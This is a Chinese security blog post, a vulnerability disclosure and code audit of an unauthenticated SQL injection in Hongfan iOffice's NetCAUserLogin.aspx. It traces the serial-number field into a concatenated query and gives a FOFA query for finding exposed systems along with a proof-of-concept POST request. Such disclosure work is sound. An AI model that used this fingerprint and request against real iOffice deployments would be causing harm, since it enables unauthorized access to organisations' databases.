---
title: "红帆ioffice NetCAUserLogin.aspx SQL 注入漏洞"
source: https://mrxn.net/jswz/ioffice-Identity-NetCAUserLogin-sqli.html
asset_dir: assets/红帆ioffice-netcauserlogin.aspx-sql-注入漏洞
---

# 红帆ioffice NetCAUserLogin.aspx SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/21 12:19
- 1021浏览
- [4评论](#comment)
- 47分钟阅读

深入探索

数据库

鉴权

认证

---

# 漏洞简介

红帆iOffice的/ioffice/Identity/NetCAUserLogin.aspx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。攻击者可通过构造恶意SQL语句，未经身份验证地获取数据库敏感信息，影响范围包括红帆iOffice系统的数据访问权限。

SQL注入检测工具

# 影响版本

# fofa语法

> (title="iOffice.net" || body="/iOffice/js" || (body="iOffice.net" && header!="couchdb" && header!="drupal") || body="iOfficeOcxSetup.exe" || body="Hongfan. All Rights Reserved")

# 漏洞分析

先看下`NetCAUserLogin.aspx` 里引用的代码在哪里（`Inherits`）

```
<%@ Page Language="vb" AutoEventWireup="false" Inherits="iden.NetCAUserLogin" Codebehind="NetCAUserLogin.aspx.vb"  %>
```

去bin目录找到`iden.dll`后编译打开，看`NetCAUserLogin`它的实现逻辑

代码安全审计

```
namespace iden;

public class NetCAUserLogin : WebPageBase
{
  [AccessedThroughProperty("form1")]
  private HtmlForm _form1;
  [AccessedThroughProperty("ioScriptManager1")]
  private ioScriptManager _ioScriptManager1;
  [AccessedThroughProperty("updatePanel1")]
  private ioUpdatePanel _updatePanel1;
  [AccessedThroughProperty("btVerify")]
  private Button _btVerify;
  [AccessedThroughProperty("btSetVisitBefore")]
  private Button _btSetVisitBefore;
  [AccessedThroughProperty("lblSerialNum")]
  private TextBox _lblSerialNum;
  [AccessedThroughProperty("ReConnect")]
  private HtmlAnchor _ReConnect;
  private string callback;

  public NetCAUserLogin()
  {
    ((Control) this).Load += new EventHandler(this.Page_Load);
    this.callback = "";
  }
```

深入探索

恶意软件分析工具

Docker加速服务

云安全解决方案

最开始的一些变量定义，前端按钮`btVerify`

```
<script type="text/javascript">
    signV();
    GetThumbPrint_Demo();
    var obj = document.getElementById("btVerify");
    obj.click();
</script>
```

对应的后端的

漏洞预警服务

```
protected virtual Button btVerify
{
  [DebuggerNonUserCode] get => this._btVerify;
  [DebuggerNonUserCode, MethodImpl((MethodImplOptions) 32)] set
  {
    EventHandler eventHandler = new EventHandler(this.btVerify_Click);
    if (this._btVerify != null)
      this._btVerify.Click -= eventHandler;
    this._btVerify = value;
    if (this._btVerify == null)
      return;
    this._btVerify.Click += eventHandler;
  }
}
```

跟进`btVerify_Click`看下

```
protected void btVerify_Click(object sender, EventArgs e)
{
  if (Operators.CompareString(this.lblSerialNum.Text.Trim(), "", false) == 0)
    return;
  iden.iden.iKeyNetCA iKeyNetCa = new iden.iden.iKeyNetCA();
  iKeyNetCa.EmpID = checked ((int) Math.Round(Conversion.Val(this.Emp.EmpID)));
  iKeyNetCa.SubjectName = "NetCA";
  iKeyNetCa.Serial = this.lblSerialNum.Text;
  switch (iKeyNetCa.Verify())
  {
    case 0:
      Page pgeParent = (Page) this;
      pf.ShowMessage(ref pgeParent, "这个证书没有分配给当前用户，认证无效！");
      break;
    case 1:
      EmpCookie empCookie = new EmpCookie("ioLogin");
      if (empCookie.GetCookie() != null)
      {
        empCookie.ItemAdd("Verified", "true");
        empCookie.SaveCookie();
      }
      this.Session["VisitBefore"] = (object) "true";
      this.Response.Redirect(ioSet.GetLoginCookieToUrl());
      break;
  }
}
```

在判断`lblSerialNum`不为空后带入`iKeyNetCa.Verify()` 方法，跟进看下

编程

```
public override int Verify()
{
  if (Operators.CompareString(this.Serial, "", false) != 0)
    this.LookupEmpAndLogin(this.Serial);
  return Operators.ConditionalCompareObjectGreater(SqlData.ExecuteScalar(Globals.ConnectString, (CommandType) 1, $"{$"{"select count(*) " + " from ssIdentity "} where EmpID={Conversions.ToString(this.EmpID)}"} and Serial='{this.Serial}'"), (object) 0, false) ? -1 : 0;
}
```

`Serial`即`lblSerialNum`又先被带入`LookupEmpAndLogin` 方法

```
protected void LookupEmpAndLogin(string SearchKey)
{
  if (Operators.ConditionalCompareObjectEqual(HttpContext.Current.Session["VisitBefore"], (object) "", false) && Operators.CompareString(ioSet.GetClientSet("硬件认证直接登录"), "", false) != 0)
  {
    int iEmpID = this.LookupEmp(SearchKey);
    if (iEmpID == 0)
      return;
    this.EmpID = this.LoginiOffice(iEmpID) != 0 ? 0 : iEmpID;
  }
}
```

继续跟进`LookupEmp` 方法

```
protected virtual int LookupEmp(string SearchKey)
{
  object objectValue = RuntimeHelpers.GetObjectValue(SqlData.ExecuteScalar(Globals.ConnectString, (CommandType) 1, $"select empid from ssIdentity where Serial='{SearchKey}'"));
  return objectValue == DBNull.Value ? 0 : Conversions.ToInteger(objectValue);
}
```

ok,到这里，漏洞成因就非常明了了，从前端`TextBox`获取的**lblSerialNum**最终经过一系列赋值传递后被直接拼接进`$"select empid from ssIdentity where Serial='{SearchKey}'"` sql语句里，全程无过滤或者校验，从而造成了[SQL注入](https://mrxn.net/tag/SQL注入)漏洞。

# 漏洞复现

> 漏洞复现需要打开漏洞文件页面获取一些其他必要参数如**\_\_VIEWSTATE**之类

```
POST /ioffice/Identity/NetCAUserLogin.aspx HTTP/1.1
Host: ioffice.mrxn.net

ioScriptManager1%24ScriptManager1=updatePanel1%7CbtVerify&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=xxxxxxxxxxxxxxx&__VIEWSTATEGENERATOR=xxxxxxxxxxx&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=0&lblSerialNum='SQLI_POC&__ASYNCPOST=true&btVerify=
```

[![红帆ioffice NetCAUserLogin.aspx SQL 注入漏洞](images/img-001-d0264769aefa.webp)](https://image.mrxn.net/ea92d61d5e3e4b66971055a2998b48f2.webp)

成功利用报错注入在响应回显当前数据库用户信息

网络安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
